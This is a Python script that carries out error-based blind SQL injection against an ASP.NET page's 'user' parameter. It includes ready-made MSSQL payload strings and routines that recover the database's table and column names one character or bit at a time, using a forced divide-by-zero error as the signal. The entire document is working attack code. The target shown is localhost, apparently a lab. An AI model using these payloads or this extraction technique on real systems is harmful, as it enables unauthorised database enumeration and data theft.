import urllib2,time,binascii,string

avrCount=-1
sqlitbs='t\';if((convert(binary(1),substring((select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+(%s)),%s,1),0)/power(2,%s))%%2)=0+(select+1/0);--'
sqlicbs='t\';if((convert(binary(1),substring((select+top+1+column_name+from+information_schema.columns+where+table_name=\'%s\'+and+column_name+not+in+(%s)),%s,1),0)/power(2,%s))%%2)=0+(select+1/0);--'
sqlitc='t\';if(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+(%s))+like+\'%s%%\'+(select+1/0);--'
sqlicc='t\';if(select+top+1+column_name+from+information_schema.columns+where+table_name=\'%s\'+and+column_name+not+in+(%s))+like+\'%s%%\'+(select+1/0);--'
url = "http://localhost:12897/Default.aspx?try=yes&user=t"
proxy = urllib2.ProxyHandler({'http':'127.0.0.1:8080'})

opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)

totalreq=0

def getAverage():
	global avrCount
	total=0
	for i in range(0,avrCount):
		start = time.clock()
		resp = urllib2.urlopen(url)
		end = time.clock()
		total+=end-start
	return total/avrCount

def getTableChar(knownTables):
	global sqlitc,totalreq
	done=False
	tables='\'\''
	t=''
	for x in knownTables:
		tables+=',\''+x+'\''
	
	while not done:
		for s in string.ascii_letters+string.digits:
			resp=urllib2.urlopen(url+(sqlitc%(tables,t+s))).read()
			totalreq+=1
			if "error has occurred" in resp:
				t+=s
				break
			if s=='9':
				done=True
	return t
	
def getTableBitshift(knownTables):
	global sqlitbs,totalreq
	done=False
	c=1
	tables='\'\''
	t=''
	for x in knownTables:
		tables+=',\''+x+'\''
		
	while not done:
		bin=''
		for i in range(0,7):
			resp = urllib2.urlopen(url+(sqlitbs%(tables,c,i)))
			totalreq+=1
			if "error has occurred" in resp.read():
				bin='0'+bin
			else:
				bin='1'+bin
		i=int('0b'+bin,2)
		if i>0 and i<127:
			t+=binascii.unhexlify('%x'%(i))
		else:
			done=True	
		c+=1
	return t
	
def getColumnChar(targetTable,knownColumns):
	global sqlicc,totalreq
	done=False
	columns='\'\''
	col=''
	for x in knownColumns:
		columns+=',\''+x+'\''
		
	while not done:
		for s in string.ascii_letters+string.digits:
			resp=urllib2.urlopen(url+(sqlicc%(targetTable,columns,col+s))).read()
			totalreq+=1
			if "error has occurred" in resp:
				col+=s
				break
			if s=='9':
				done=True
	return col
	
def getColumnBitshift(targetTable,knownColumns):
	global sqlicbs,totalreq
	done=False
	c=1
	columns='\'\'' 
	col=''
	for x in knownColumns:
		columns+=',\''+x+'\''
		
	while not done:
		bin=''
		for i in range(0,7):
			resp=urllib2.urlopen(url+(sqlicbs%(targetTable,columns,c,i)))
			totalreq+=1
			if "error has occurred" in resp.read():
				bin='0'+bin
			else:
				bin='1'+bin
		i=int('0b'+bin,2)
		if i>0 and i!=127:
			col+=binascii.unhexlify('%x'%(i)) 
		else:
			done=True
		c+=1
	return col
	
def printPretty(array):
	s=''
	for a in array:
		s+=a+' '
	print '\t%s'%s

def main():
	global totalreq
	avResp=getAverage()
	knownTables=[]
	print '[*] Average response time:\t%s' % avResp
	start=time.clock()
	while len(knownTables) == 0 or len(knownTables[len(knownTables)-1]) > 1:
		knownTables.append(getTableChar(knownTables))
	knownTables.pop();
	print '[*] Tables found:'
	printPretty(knownTables)		
	for t in knownTables:
		knownColumns=[]
		s=''
		while len(knownColumns)==0 or len(knownColumns[len(knownColumns)-1]) > 0:
			knownColumns.append(getColumnChar(t,knownColumns))
		knownColumns.pop()
		print '[*] Columns found for table:\t%s' % t
		printPretty(knownColumns)
	end=time.clock()
	
	print 'Total time:\t\t%s' % (end-start)
	print 'Number of requests:\t%s' % totalreq
	
if __name__ == "__main__":
	main()

